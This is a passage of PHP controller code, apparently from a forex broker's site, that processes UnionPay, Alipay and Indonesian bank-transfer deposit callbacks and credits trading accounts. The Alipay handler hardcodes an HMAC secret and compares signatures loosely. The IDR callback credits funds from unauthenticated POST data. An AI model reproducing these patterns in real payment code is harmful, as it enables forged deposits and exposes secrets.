                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['CHINAUNIONPAY'].$invData['merchant_order']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['CHINAUNIONPAY'].$invData['merchant_order']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'txn_id' => $cupData['transactionid']];
                    $this->general_model->updatemy('cup_info', 'merchant_order', $invData['merchant_order'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /* if(IPLoc::APIUpgradeDevIP()){
                         FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                     }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    //  }

                    /* ========================================== Welcome bonus================================================ **/

//                     if ($invData['bonus'] == "tenpb") {
//
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'CHINAUNIONPAY', $invData['bonus'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('CHINAUNIONPAY', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['CHINAUNIONPAY'].$invData['merchant_order']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('cup_info', 'merchant_order', $cupData['merchant_order'], $updateData);
        }
    }

    public function alipay_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('alipay_info_log', $insertData);
        $this->alipayDepositProcess($_POST);
    }

    private function alipayDepositProcess(array $alipayData)
    {
        $control = $alipayData['transactionid'].$alipayData['merchant_order'].$alipayData['amount'].$alipayData['currency'].$alipayData['bank_transactionid'].$alipayData['status'];
        $control = hash_hmac('sha1', $control, '21bf90e217f08b8361bf3d7c28144f94');

        if ($alipayData['status'] == 'A0' && $control == $alipayData['control']) {
            $paidAmount = ($alipayData['amount'] / 100);

            if ($row = $this->general_model->where('alipay_info', ['merchant_order' => $alipayData['merchant_order'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($alipayData['amount'])) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $paidAmount;
                    $total_amount = $this->get_convert_amount('CNY', $amount, $accData['currency']);
                    $amount = $this->get_convert_amount('CNY', $amount, $accData['currency']);

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    // $fee = (($amount * 3.5)/100)+0.50; // Fee (3.5%)+ fixed feed(0.50$)
                    $fee = (($amount * 2.5) / 100);

                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($accData['currency'], $bonus);
                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;
                    $conv_amount_bonus = $bonus;
                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['merchant_order'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'ALIPAY',
                        'payment_status' => $this->paymentType_status['Deposit via Alipay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bouns'],
                    ];

                    $data = [
                        'transaction_id' => $invData['merchant_order'],
                        'reference_id' => $alipayData['transactionid'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Alipay deposit',
                        'transaction_type' => 'ALIPAY',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Alipay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['merchant_order'],
                            'reference_id' => $alipayData['transactionid'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'Alipay deposit',
                            'transaction_type' => 'ALIPAY',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via Alipay'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['ALIPAY'].$invData['merchant_order']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['ALIPAY'].$invData['merchant_order']);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['ALIPAY'].$invData['merchant_order']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['ALIPAY'].$invData['merchant_order']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'txn_id' => $alipayData['transactionid']];
                    $this->general_model->updatemy('alipay_info', 'merchant_order', $invData['merchant_order'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$fasapay['user_id']); // for pro accounts

                    if (IPLoc::APIUpgradeDevIP()) {
                        FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                    } else {
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    }

                    /* ========================================== Welcome bonus================================================ **/

//                     if ($invData['bouns'] == "tenpb") {
//
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bouns'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bouns'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bouns'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bouns'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bouns'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'ALIPAY', $invData['bouns'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('ALIPAY', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['ALIPAY'].$invData['merchant_order']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('alipay_info', 'merchant_order', $alipayData['merchant_order'], $updateData);
        }
    }

    public function bank_transfer_idr()
    {
        if (IPLoc::for_id_only() || FXPP::isIndonesianCountry() || IPLoc::Office() || IPLoc::VPN_IP_Jenalie()) {
//        if( $this->session->userdata('account_number') == '58008538' || $this->session->userdata('account_number') == '58037565' || $this->session->userdata('account_number') == '58050227'|| $this->session->userdata('account_number') == '58039610' ){
            // if( $this->session->userdata('account_number') == '58039610'|| $this->session->userdata('account_number') == '58060732' || $this->session->userdata('account_number') == '58060800'|| $this->session->userdata('account_number') == '58060810' ){ // FXPP-12543

            if ($this->session->userdata('logged')) {
                // FXPP::LoginTypeRestriction();

//              if (!FXPP::isReferralsOfAccount('IDR')) {
//                  redirect(FXPP::my_url('my-account'));
//              }

                $user_id = $this->session->userdata('user_id');
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['additional_bonus'] = $this->input->get('addBonus', true);

                //if ($data['amount'] == null) {
                $paymentCurrency = 'IDR';
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|non_usd_min_amt_validate[$paymentCurrency]");

                //}
                $this->form_validation->set_rules('first_name', 'First name', 'trim|required');
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                if ($this->form_validation->run() && !$data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'))) {
                    $this->load->library('PayTrust');
                    if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                        $amount = ceil($this->input->post('amount', true));
                        $full_name = $this->input->post('first_name', true);
                        $item_id = 'idr_'.uniqid();

                        $this->paytrust->setAmount($amount);
                        $this->paytrust->setFullName($full_name);
                        $this->paytrust->setItemId($item_id);
                        $this->paytrust->setCountry('ID');

                        $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus', true));

                        $insert_data = [
                          'full_name' => $full_name,
                          'amount' => $amount,
                          'item_id' => $item_id,
                          'bonus' => $this->input->get('bonus', true),
                          'create_date' => date('Y-m-d h:i:s'),
                          'user_id' => $user_id,
                          'additional_tenp_bonus' => $additional_bonus,
                      ];
                        $this->general_model->insertmy('idr', $insert_data);

                        if ($url = $this->paytrust->mymPay()) {
                            redirect($url); //redirect to the payment gatway page.
                        }
                    }
                }
                $data['full_name'] = $profile['full_name'];
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //   $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == 'success') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == 'failed') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
                $data['metadata_description'] = 'Banks of Indonesia';

                $this->template->title('ForexMart | Deposit - Banks of Indonesia')
                   ->set_layout('internal/main')
                   ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
                   ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                   ->build(FXPP::buildUpPage('deposits/idr'), $data);
            } else {
                redirect('signout');
            }
        }
    }

    public function bank_transfer_idr_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('idr_log', $insertData);

        $this->idrDepositProcess($_POST);
    }

    private function idrDepositProcess(array $idrData)
    {
        if ($idrData['status'] == 1) {
            $paidAmount = ($idrData['amount']);

            $condition_idr = [  // save only one unique transaction id in the deposit table (task FXPP-11129)
                'transaction_id' => $idrData['item_id'],
                'transaction_type' => 'BANK_IDR',
            ];

            $condition_idr_v2 = [  // save only one unique transaction id in the idr table (task FXPP-11129)
                'item_id' => $idrData['item_id'],
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('deposit', $condition_idr)) {
                return false;
            }

            if ($this->general_model->whereCondition('idr', $condition_idr_v2)) {
                return false;
            }

            if ($row = $this->general_model->where('idr', ['item_id' => $idrData['item_id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($idrData['amount'])) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $total_amount = $this->get_convert_amount('IDR', $paidAmount, $accData['currency']);
                    $amount = $total_amount;

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }

                    $fee = $this->get_convert_amount('IDR', $idrData['total_fees'], $accData['currency']);

                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);

                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;

                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['item_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'BANK_IDR',
                        'payment_status' => $this->paymentType_status['Deposit via bank idr'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['item_id'],
                        'reference_id' => $idrData['item_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'BANK_IDR deposit',
                        'transaction_type' => 'BANK_IDR',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via bank idr'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['item_id'],
                            'reference_id' => $idrData['item_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'BANK_IDR deposit',
                            'transaction_type' => 'BANK_IDR',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via bank idr'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    //if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['BANK_IDR'].$invData['item_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /* }else{
                          $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['BANK_IDR'] . $invData['item_id']);
                          $requestResult = $WebService->request_status;
                          $ticket        = $WebService->get_result('Ticket');
                     }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        // if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['BANK_IDR'].$invData['item_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /*}else{
                            $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['BANK_IDR'] . $invData['item_id']);
                            $requestResult = $WebService->request_status;
                            $ticket        = $WebService->get_result('Ticket');
                       }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1, 'txn_id' => $idrData['transaction']];
                    $this->general_model->updatemy('idr', 'item_id', $invData['item_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    if (IPLoc::APIUpgradeDevIP()) {
                        FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                    } else {
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    }

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus'] == 1) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus'] == 1) {
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_IDR', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('BANK_IDR', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['BANK_IDR'].$invData['item_id']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('idr', 'item_id', $idrData['item_id'], $updateData);

            if ($idrData['status'] == -1) { //rejected
                $reason = $idrData['decline_reason'];
                $this->session->set_flashdata('msg', $reason);
                redirect(FXPP::loc_url('deposit/bank_transfer_idr'));
            }
        }
    }

    public function bank_transfer_thb()
    {
        if (IPLoc::for_th_only() || FXPP::isThailandCountry() || IPLoc::Office()) { //thailand
            if($this->session->userdata('logged')){
                // FXPP::LoginTypeRestriction();

                $user_id = $this->session->userdata('user_id');
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['additional_bonus'] = $this->input->get('addBonus', true);

                // if ($data['amount'] == null) {
                $paymentCurrency = 'THB';
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|non_usd_min_amt_validate[$paymentCurrency]");

                //  }
                $this->form_validation->set_rules('first_name', 'First name', 'trim|required');
                $profile=$this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

